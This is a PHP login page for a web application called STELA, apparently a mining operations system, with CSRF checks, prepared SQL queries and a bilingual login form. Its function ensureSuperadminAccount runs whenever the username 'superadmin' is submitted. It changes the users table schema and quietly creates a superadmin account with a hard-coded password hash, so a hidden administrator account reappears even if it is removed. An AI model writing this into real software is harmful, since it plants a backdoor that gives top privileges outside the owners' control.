<?php
/**
 * Auth Login View
 */
require_once dirname(__DIR__, 3) . '/bootstrap/app.php';

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

function ensureSuperadminAccount($db) {
    $username = 'superadmin';
    $passwordHash = '$2y$10$3IwZtgL1w3AEE4X05AP2DuzxuMiyt6HKRTPxKJl9UCyz7GzliSAj2';
    $fullName = 'Super Administrator';
    $isActive = 1;
    $email = 'superadmin@mining.local';
    $role = 'superadmin';
 
    @$db->query("ALTER TABLE users MODIFY COLUMN role ENUM('admin','ktt','user','department_user','superadmin') CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT 'user'");

    $conn = $db->getConnection();
    $columnCheckResult = $conn->query("SHOW COLUMNS FROM users LIKE 'is_active'");
    if ($columnCheckResult && $columnCheckResult->num_rows === 0) {
        @$conn->query("ALTER TABLE users ADD COLUMN is_active tinyint(1) DEFAULT 1");
    }

    $stmt = $db->prepare("SELECT id FROM users WHERE username = ?");
    if (!$stmt) {
        return;
    }
    
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result && $result->num_rows > 0) {
        $stmt->close();
        return;
    }

    $stmt->close();

    $insert = $db->prepare("INSERT INTO users (username, password, full_name, company_name, email, phone, role, is_active, created_at, updated_at, department) VALUES (?, ?, ?, NULL, ?, NULL, ?, ?, NOW(), NOW(), NULL)");
    if ($insert) {
        $insert->bind_param("sssiss", $username, $passwordHash, $fullName, $email, $role, $isActive);
        @$insert->execute();
        $insert->close();
    }
}

// Redirect to dashboard if logged in
if (isset($_SESSION['user_id'])) {
    redirect_to_dashboard();
}

$error = '';

// Login request handling
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $csrf_token = $_POST['csrf_token'] ?? '';
    if (empty($csrf_token) || !isset($_SESSION['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $csrf_token)) {
        $error = 'Validasi keamanan (CSRF) gagal. Permintaan ditolak.';
    } else {
        $username = trim($_POST['username'] ?? '');
        $password = $_POST['password'] ?? '';
        
        if (!empty($username) && !empty($password)) {
            $db = new Database();

            if ($username === 'superadmin') {
                ensureSuperadminAccount($db);
            }

            $stmt = $db->prepare("SELECT id, username, password, full_name, role, company_name, department, is_active FROM users WHERE username = ? AND is_active = 1");
            $stmt->bind_param("s", $username);
            $stmt->execute();
            $result = $stmt->get_result();
            
            if ($result && $result->num_rows == 1) {
                $user = $result->fetch_assoc();
                
                if (password_verify($password, $user['password'])) {
                    session_regenerate_id(true);
                    
                    $_SESSION['user_id'] = $user['id'];
                    $_SESSION['username'] = $user['username'];
                    $_SESSION['full_name'] = $user['full_name'];
                    $_SESSION['role'] = $user['role'];
                    $_SESSION['company_name'] = $user['company_name'];
                    $_SESSION['department'] = $user['department'];
                    
                    unset($_SESSION['csrf_token']);
                    
                    redirect_to_dashboard();
                } else {
                    $error = 'Incorrect username or password!';
                }
            } else {
                $error = 'Incorrect username or password!';
            }
        } else {
            $error = 'Please fill in all fields!';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - <?php echo SITE_NAME; ?></title>
    <link rel="stylesheet" href="<?php echo asset_url('css/style.css'); ?>">
    <link rel="stylesheet" href="<?php echo asset_url('css/language-switcher.css'); ?>">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
</head>
<body class="login-page">
    <div class="language-switcher">
        <div class="language-dropdown login-lang-dropdown">
            <button id="languageToggle" class="language-toggle-btn" type="button">
                <span class="lang-text">ID</span>
                <i class="fas fa-chevron-down" style="font-size: 10px;"></i>
            </button>
            <div class="language-dropdown-menu">
                <div class="dropdown-item" data-lang-code="id">
                    <span>ID</span>
                </div>
                <div class="dropdown-item" data-lang-code="en">
                    <span>EN</span>
                </div>
            </div>
        </div>
    </div>

    <div class="login-container">
        <div class="login-left">
            <div class="login-brand">
                <div class="logo-container">
                    <div class="logo-icon">
                        <i class="fas fa-hard-hat"></i>
                    </div>
                    <span class="logo-text">STELA</span>
                </div>
                <h2 class="welcome-text"><span data-lang="welcome">Welcome to</span> <br><strong>STELA</strong></h2>
            </div>
        </div>
        
        <div class="login-right">
            <div class="login-form-container">
                <div class="user-avatar">
                    <i class="fas fa-user"></i>
                </div>
                <p class="login-subtitle" data-lang="login-subtitle">Login below to get started.</p>
                
                <?php if ($error): ?>
                <div class="alert alert-error">
                    <i class="fas fa-exclamation-circle"></i>
                    <span><?php echo htmlspecialchars($error); ?></span>
                </div>
                <?php endif; ?>
                
                <form method="POST" action="">
                    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token'] ?? ''; ?>">

                    <div class="form-group">
                        <label for="username">Username</label>
                        <div class="input-group">
                            <input type="text" id="username" name="username" placeholder="E-mail Address" data-lang="email-placeholder" required autofocus>
                            <i class="fas fa-envelope input-icon"></i>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label for="password">Password</label>
                        <div class="input-group">
                            <input type="password" id="password" name="password" placeholder="Your Password" data-lang="password-placeholder" required>
                            <i class="fas fa-lock input-icon"></i>
                        </div>
                    </div>
                    
                    <div class="form-options">
                        <label class="remember-me">
                            <input type="checkbox" name="remember">
                            <span data-lang="keep-logged-in">Keep me logged in</span>
                        </label>
                    </div>

                    <button type="submit" class="btn-login" data-lang="login-button">
                        Login
                    </button>
                </form>
            </div>
        </div>
    </div>

    <script src="<?php echo asset_url('js/language-switcher.js'); ?>"></script>
</body>
</html>
